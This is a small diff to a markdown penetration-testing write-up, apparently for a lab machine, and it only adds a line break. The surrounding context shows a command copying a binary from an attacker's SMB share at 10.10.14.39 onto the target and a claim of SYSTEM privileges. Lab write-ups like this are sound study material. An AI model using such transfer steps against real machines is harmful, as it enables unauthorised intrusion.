@@ -100,5 +100,5 @@ And downloaded the file in the target machine:
 copy '\\\10.10.14.39\a\whoami.exe'
 ```
 Ran the binary, as saw that I have NT AUTHORITY/SYSTEM privileges.\
-Proof Screenshot here: </br>
+Proof Screenshot here: </br> </br>
 ![priv_esc_poc](images/legacy_privesc_poc.png)
